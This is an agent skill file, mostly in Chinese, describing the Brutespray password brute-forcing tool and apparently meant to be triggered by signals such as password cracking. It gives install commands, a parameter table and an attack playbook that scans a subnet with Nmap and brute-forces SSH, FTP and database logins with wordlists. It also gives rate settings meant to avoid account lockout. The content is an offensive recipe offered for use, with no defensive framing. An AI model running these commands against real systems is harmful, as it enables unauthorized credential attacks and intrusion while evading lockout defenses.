---
name: brutespray-service-brute
description: "Brutespray: Feeds Nmap results directly into brute-force attacks. Signals: password cracking, hash cracking, SSH-only brute force, rate limiting to avoid lockout."
zh-signals: "Brutespray: Nmap 结果直通爆破。信号:密码破解,哈希破解,仅爆破 SSH,限速防锁。"
---

# Brutespray

- 攻击大类:C25 口令与哈希破解
- 上游仓库:https://github.com/x90skysn3k/brutespray
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install brutespray 或 go install github.com/x90skysn3k/brutespray@latest
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `brutespray -f nmap.xml` | 从 Nmap 结果自动爆破所有开放服务 |
| `-s ssh -u root -p pass.txt` | 仅爆破 SSH |
| `-c 5 -t 100` | 限速防锁 |
| `-o results.txt` | 输出 |

## 攻击场景 Playbook

### Nmap 结果直通爆破

```bash
nmap -sV -oX nmap.xml 10.0.0.0/24
brutespray -f nmap.xml -u admin -p /usr/share/wordlists/top10.txt
# 自动对 ssh/ftp/mysql/mssql 等服务起爆
```

## 注意事项

Medusa 引擎,自动解析 Nmap XML 并只对开放服务爆破,限速选项齐全。
